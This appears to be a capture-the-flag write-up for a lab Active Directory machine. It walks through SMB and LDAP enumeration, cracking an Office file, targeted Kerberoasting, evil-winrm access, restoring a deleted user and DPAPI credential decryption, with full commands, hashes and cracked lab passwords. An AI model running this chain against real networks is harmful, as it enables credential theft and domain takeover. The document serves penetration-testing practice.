
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt
## NMAP SCAN 
```
nmap -sSCV -p- 10.129.204.183                                                             
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-28 18:58 +0700
Nmap scan report for 10.129.204.183
Host is up (0.075s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-28 16:02:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
56527/tcp open  msrpc         Microsoft Windows RPC
56545/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 3h59m59s
| smb2-time: 
|   date: 2026-04-28T16:02:55
|_  start_date: N/A
```

```
nxc smb 10.129.204.183 -k -u ryan.naylor -p HollowOct31Nyt --shares --smb-timeout 10
SMB         10.129.204.183  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.204.183  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.204.183  445    DC               [*] Enumerated shares
SMB         10.129.204.183  445    DC               Share           Permissions     Remark
SMB         10.129.204.183  445    DC               -----           -----------     ------
SMB         10.129.204.183  445    DC               ADMIN$                          Remote Admin
SMB         10.129.204.183  445    DC               C$                              Default share
SMB         10.129.204.183  445    DC               Finance                         
SMB         10.129.204.183  445    DC               HR                              
SMB         10.129.204.183  445    DC               IPC$            READ            Remote IPC
SMB         10.129.204.183  445    DC               IT              READ            
SMB         10.129.204.183  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.204.183  445    DC               SYSVOL          READ            Logon server share
```

using -k for kerberos and got IT share which i can read...

```
	nxc ldap 10.129.204.183 -k -u ryan.naylor -p 'HollowOct31Nyt' --users          

LDAP        10.129.204.183  389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.204.183  389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
LDAP        10.129.204.183  389    DC               [*] Enumerated 11 domain users: voleur.htb
LDAP        10.129.204.183  389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.204.183  389    DC               Administrator                 2025-01-29 03:35:13 0        Built-in account for administering the computer/domain      
LDAP        10.129.204.183  389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.204.183  389    DC               krbtgt                        2025-01-29 15:43:06 0        Key Distribution Center Service Account                     
LDAP        10.129.204.183  389    DC               ryan.naylor                   2025-01-29 16:26:46 0        First-Line Support Technician                               
LDAP        10.129.204.183  389    DC               marie.bryant                  2025-01-29 16:21:07 0        First-Line Support Technician                               
LDAP        10.129.204.183  389    DC               lacey.miller                  2025-01-29 16:20:10 4        Second-Line Support Technician                              
LDAP        10.129.204.183  389    DC               svc_ldap                      2025-01-29 16:20:54 0                                                                    
LDAP        10.129.204.183  389    DC               svc_backup                    2025-01-29 16:20:36 0                                                                    
LDAP        10.129.204.183  389    DC               svc_iis                       2025-01-29 16:20:45 0                                                                    
LDAP        10.129.204.183  389    DC               jeremy.combs                  2025-01-29 22:10:32 0        Third-Line Support Technician                               
LDAP        10.129.204.183  389    DC               svc_winrm                     2025-01-31 16:10:12 0 
```

got users

```
xc smb dc.voleur.htb --generate-krb5-file krb5.conf 
SMB         10.129.204.183  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.204.183  445    DC               [+] krb5 conf saved to: krb5.conf
SMB         10.129.204.183  445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=krb5.conf
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ sudo cp krb5.conf /etc/krb5.conf

```

have to get krb5 file for realm as it is kerberos.... 
```
smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 16:10:01 2025
  ..                                DHS        0  Fri Jul 25 03:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 16:40:17 2025

                5311743 blocks of size 4096. 999082 blocks available
smb: \> cd "First-Line Support\"
smb: \First-Line Support\> ls
  .                                   D        0  Wed Jan 29 16:40:17 2025
  ..                                  D        0  Wed Jan 29 16:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 21:14:25 2025

                5311743 blocks of size 4096. 999082 blocks available
smb: \First-Line Support\> get Access_Review.xlsx 
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)

```

we have to use --realm flag as we just put the ream file... otherwise will not able to connect 
file is password protected so have to use john to get the pass.... 
```
office2john Access_Review.xlsx > hash.txt
                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:01 DONE (2026-04-28 23:50) 0.7874g/s 629.9p/s 629.9c/s 629.9C/s rocker..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

football1 is the pass... 
```
|   |   |   |   |
|---|---|---|---|
|**User**|**Job Title**|**Permissions**|**Notes**|
|Ryan.Naylor|First-Line Support Technician|SMB|Has Kerberos Pre-Auth disabled temporarily to test legacy systems.|

|Marie.Bryant|First-Line Support Technician|SMB||

|Lacey.Miller|Second-Line Support Technician|Remote Management Users||

|~~Todd.Wolfe~~|Second-Line Support Technician|Remote Management Users|Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.|

|Jeremy.Combs|Third-Line Support Technician|Remote Management Users.|Has access to Software folder.|

|Administrator|Administrator|Domain Admin|Not to be used for daily tasks!|

|**Service Accounts**||||
|svc_backup||Windows Backup|Speak to Jeremy!|
|svc_ldap||LDAP Services|P/W - M1XyC9pW7qT5Vn|
|svc_iis||IIS Administration|P/W - N5pXyW1VqM7CZ8|
|svc_winrm||Remote Management|Need to ask Lacey as she reset this recently.|
```
got new user Todd.wolfe and some passwords... 
lets see which user can get us bloodhound files.. 
```
bloodhound-python -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d voleur.htb -ns 10.129.204.183 -dc dc.voleur.htb -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 47S
INFO: Compressing output into 20260428235730_bloodhound.zip

```

![[Pasted image 20260428143306.png]]
got the attack path
1. WriteSPN and get svc_winrm password
2. GenericWrite on LACEY and SECOND-LINE Support 

lets use https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py to get winrm pass (its automated)
doesnt work but a good script to run sometime 

ok so we were using ryan's CCACHE so it was giving error 
```
impacket-getTGT -dc-ip 10.129.204.183 voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_ldap.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=svc_ldap.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 targetedKerberoast.py -k -v -d 'voleur.htb' --dc-host dc.voleur.htb -u 'svc_ldap' --request-user 'svc_winrm'
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$7398c99734705d77f40d970385213545$fcd93bc076aecb107f6c8b799ac8c364827f626413311eb53b0125d7c02091da4cc962b4ad849065d53b75dfe25b124146d099c6169bc3bec7ba9efa718f6f7206756863ad6898d41d755c6d3a4a70bd2727531b2f4457ce80160bb5b29bcbfe7aaabe94ed6c1229eefd5a91a6ef6671e8369cb1b5d3e0e44c2339b4ca0ea5a5e1b29376e673c86e73a8f6befeec20210e755bb7e6575c202c825106bfffe75d2aba1c1a743a5c58d34aa1028108d5506b5432e84cf33821a5c95f1cb9a81705bebe1210a17a83675bfc676a4333a24ed09f32b216df1e85c1c8819ec0fcae4fceb473fa1941f2a48fd0f31ed464e77b107dd16ba9e158af2ee607dc9d2fa8f04feb9d1f0bf8491412a45e92eb4869827099a974f8d11f38369316daa665735fe6b43b0c80ad59ad9aceff58c1c10b004ada45d1ad6747bd0dc02800e3ca2e851c7d658a7f791a604530086265721332c92c91a79b18ff697836db4a7560e7fbec7dedc2ec32f42df3b2a71fe87a9686cc4aa440724a4faf9b0063a7d9ed9e08fec0cb33feb3f90993a430d102ae8c89ded2b2901e275dfd6602b5040ee91f5229b3c2326f3db960a1e4941d2a6205a53a6493c7c5a5e3bc8436ce72980ba71a64fac39c5b424dd059ac01f3dbb3e87a9b136ccc6619146e293646dab0c7177991b879f77340f37fa3efd1c16f0377673e870e773ecbcc7cdc6eadd98aee9c8b4e6dd221b1e7e457963782fffcad416034563b4a040b7e2865b63bcf532bcdca821f4b096c0fd6da336a00439ae18e36756a9b41da3532bd51fa3db49c9d72943ff7ff29f27bebca56e9d83ed9fc5f346e6cae44b30ea999423db33d60950d04510a22f9f02e514f654c8021c97a548f91d4b6578ace869f8a8e514e4681f9add9fe97ed0ac57e425030ece8b492c20bf78a8dc51b1af387b72e9506c885f23ca7c7c0ad9342d3bc7e7a9768cc863ad3c4f3693f9600e60f4e3749ca7d222c3a4afd02ff4b88985a03ce5cfefb1f7d6a604d013e6047bdef017a24ec07358b5dbe78e54ccd66411460dd6c9d48a9141fb5f5dfb69c4885e17f7f1814d1cf78a9f25db99f8a6117c8f5ff08675b196349ff660cc0f527a2be0787cece83c2145f42e31fb9fc3c8d72ce1438216aa0f7697124927642a0e5622a4e525074506e5310845e68e1ba4c6a085d67fcfaf1c4c3a9678e17c71f44169a781fa2cb072a5b862b599ed4967b4da10981a61cc2908c4007a008d136409074f47483da296a5204bbd8fd5abfcc4d43aafd255c485c7de8c7671e0e33af06a2f01cb852948cff2d18cbc9e8eedc4462e5d8c014a85a8963cefdf76178dc74d524dfa3a563a4f30414d81eb4ced5d92d4ad501b87e10ead60c05642d7fa03e20ea6c95c3504e0ef5d23e4acc030ea9eca2e0c2eab4b2ca71c7a5894d100998eb6a9a03ddce19b2ae9f8ba64bc44f2f474b8eeb17969600b420d7
[VERBOSE] SPN removed successfully for (svc_winrm)

```

got the tgs
```
ohn --wordlist=/usr/share/wordlists/rockyou.txt winrm.tgs 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:03 DONE (2026-04-29 00:13) 0.3236g/s 3712Kp/s 3712Kc/s 3712KC/s AGGIES91..ADUB32
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
got the pass 
svc_winrm AFireInsidedeOzarctica980219afi
```
nxc ldap 10.129.204.183 -u 'svc_winrm' -p AFireInsidedeOzarctica980219afi -k                             

LDAP        10.129.204.183  389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.129.204.183  389    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```

now lets get lacey's creds

```
python3 targetedKerberoast.py -k -v -d 'voleur.htb' --dc-host dc.voleur.htb -u 'svc_ldap' --request-user 'lacey.miller'
[*] Starting kerberoast attacks
[*] Attacking user (lacey.miller)
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$15158d764bd7b0a162843eb72a119fc9$10f02cc8bf23ecccddf9642d748182c78c6b3f0968782649d7617c785a23c6f5fa511d2643336a8de40be3c249bc60d5b6604e42266d0f47b3cc3e1be1afd41498cde64e5f7f921828a3a5563cdebd1441d245620d6e9141a1ec6e13dbd57a931006c4b9e057795ce7eefac0fff57c1a869d847d3d0add5961fc6f476b12dce56f471da3e52fc084eba8d8e781500268289b7131b2e834cb7f26e0b0ec3d0fbebf684dbe7fafc463accc3f7918fe2c965c0f9e174ed5cf05a44a4e1d2f8697eb9e052c97a0ff4e3024707ed77ebe69a72ef5b83c99e927aabe130b0ae24412de5cd2e6f93468fc3056a4a2a452ade9c36962c2483226abc7f78489821db6e53c7b567f5604ac3a7e8867ffac721d38673dfc31eb0a0cdab0556970ff1bc3a1cf11ccf275016af3d5daed442553b0dd24af537aad780613b3a22738500880c4e9dec1561e7e9514569f89b6c2090edbde723ba99425eace23d58bac1f24e44fb4f7f5d9885f3b13f7c721aa596006eeaf7709a6b65abc88222280a7694bd10f72573878a9720342c5f63eec10e79f2256760577b3c3979b1465b685252a7b13ce1be7ba65ad416951e023c47d12554a250410801578d223a35ab282a5119309a16687333971333241349bbdbaa4c242b7bd1301e79930db562bc23d624d1f0d1e044efa70fda95133e16d98a3bbf160dd55551f4ab619bd9fcfd8af30e9e29de12e2d8e8ba10270cf62a576e8d720968742af56cb71c2323315075bf3220bd5e4152a7d665677b305bfc49bf39d8eda0027a5db28d9500c79086eadcd3ad229bc089c102c70c4d38fd106297c42a62bcf1c45ef3f806776b2132ede76251192fdcabb94e6b7adca934e2f8f76f786dd1fa2a5a714019cae6a8ee88e34fe30a0e5d522fb2b185eef9bd65ee9c90d3f82fb0aff79f62a85895826bfd393949f09c6b6f0ff74851eba4d840a2742f94d6a850c1cd68bd29a4a95c57f19b1ef09ca4695132e9e395ceb26a0adf81cd1a644625ff3008d2b03e34993de7befcdf258bd54a18b4755aa23fbdf742d014e894c3e1cc4ea6b8ad574c8f4a8b7fff0a19c9e958d26ca0b39efc9b14026770384d7bb002e2fe6b6ac71b08062beb05428c0a6fc67f7f92485d1fa9186cf1f41fa81eb5900146d49b0eba825d5f8619441594b5a266cd054a603caca2d75d110c144934002285e9bde147a8f1e21cfa075cb1eef68ab0cde4141c556cbde533b7da98f785b60e3ae121f8237d2ca9103d3c9de7d4661d50e70432da66dfe45f1c18c1897ae7ece19f5f38916885bd775cacc23ecde8799056aece0dc950c005d37a3a42ce78b577a44c910b6446cfaa81322e755c0587f3094a48c6bd58d561d35d44962bfebe74a27d8e23234cd0420173ac1a9124bf07fbd701d5bcfb00cb394f76e6bb4f597374596a22fd95e342ba3fb6250fad09ef47d3f1761fcbeab4e01f6786d32d2
[VERBOSE] SPN removed successfully for (lacey.miller)
```

not useful since winrm is also in remote management kets try to connect....
```
──(kali㉿kali)-[~]
└─$ impacket-getTGT -dc-ip 10.129.204.183 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=svc_winrm.ccache
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i dc.voleur.htb -r voleur.htb -k svc_winrm.ccache
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: Useless cert/s provided, SSL is not enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
0407c167abe36193e08f6fc444019b9c

```

we have to use tgt to connect... 
and we got the flag
```
*Evil-WinRM* PS C:\ProgramData> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn "powershell -Command Get-ADObject -Filter {samaccountname -eq 'todd.wolfe'} -IncludeDeletedObjects | Restore-ADObject"
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.
*Evil-WinRM* PS C:\ProgramData> Get-ADUser -Identity "todd.wolfe" -Properties Enabled


DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Enabled           : True
GivenName         : Todd
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
SamAccountName    : todd.wolfe
SID               : S-1-5-21-3927696377-1337352550-2781715495-1110
Surname           : Wolfe
UserPrincipalName : todd.wolfe@voleur.htb

*Evil-WinRM* PS C:\ProgramData> .\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn "powershell -Command Enable-ADAccount -Identity 'todd.wolfe'"
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

No output received from the process.

```
restored and enabled todd.wolfe... NightT1meP1dg3on14
lets get tgt... 
```
impacket-getTGT 'VOLEUR.HTB/todd.wolfe':'NightT1meP1dg3on14'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
```
now lets look at the shares.... 
```
impacket-getTGT 'VOLEUR.HTB/todd.wolfe':'NightT1meP1dg3on14'      
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=todd.wolfe.ccache                               
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-smbclient -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 03:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 21:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 22:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 19:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 19:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 19:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Videos
# cd Desktop
# ls
drw-rw-rw-          0  Thu Jan 30 21:28:50 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:16 2025 ..
-rw-rw-rw-        282  Wed Jan 29 19:53:09 2025 desktop.ini
-rw-rw-rw-       2312  Wed Jan 29 19:53:10 2025 Microsoft Edge.lnk
# cd ..
# cd AppData/Roaming/Microsoft/Protect
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 19:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 20:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 19:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# cd ..
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 19:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 19:53:08 2025 SYNCHIST
 cd ..
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 22:13:10 2025 Windows
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 22:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 20:13:50 2025 772275FAD58525253490A9B0039791D3
# cd 772275FAD58525253490A9B0039791D3
[-] SMB SessionError: code: 0xc0000103 - STATUS_NOT_A_DIRECTORY - A requested opened file is not a directory.
# get 772275FAD58525253490A9B0039791D3

```

got master key and creds file they may contain some creds.... 
```
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

got jeremy creds 
```
──(kali㉿kali)-[~]
└─$ impacket-getTGT 'VOLEUR.HTB/jeremy.combs:qT3V9pLXyN7W4m'          

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=jeremy.combs.ccache
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ impacket-smbclient -k -no-pass VOLEUR.HTB/jeremy.combs@dc.voleur.htb

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 .
drw-rw-rw-          0  Fri Jul 25 03:09:59 2025 ..
drw-rw-rw-          0  Thu Jan 30 23:11:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 23:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 16:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 23:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 23:07:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa
# exit
```

got a note file and id_rsa... there is a ssh port open on 2222 
```
cat Note.txt.txt           
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin 
```

something to do with the backup maybe we can get svc_backup creds but lets first connect to ssh and see ...
```
chmod 600 id_rsa
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ssh-keygen -y -f ./id_rsa
